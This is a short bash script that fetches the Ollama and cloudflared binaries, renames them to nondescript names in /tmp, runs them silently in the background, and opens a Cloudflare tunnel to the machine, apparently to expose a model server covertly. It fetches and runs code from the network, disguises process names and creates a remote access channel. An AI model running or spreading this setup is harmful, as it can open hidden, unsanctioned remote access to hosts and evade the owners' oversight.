#!/bin/bash
curl -L https://ollama.com/download/ollama-linux-amd64 -o /tmp/sys-x
chmod +x /tmp/sys-x
export OLLAMA_HOST=127.0.0.1:11434
nohup /tmp/sys-x serve > /dev/null 2>&1 &
sleep 15
curl -L -o /tmp/bridge-x https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
chmod +x /tmp/bridge-x
nohup /tmp/bridge-x tunnel --no-autoupdate run --token $1 > /dev/null 2>&1 &
chmod +x ./sentinel.sh
nohup ./sentinel.sh &
while pgrep -x "sys-x" > /dev/null; do sleep 60; done
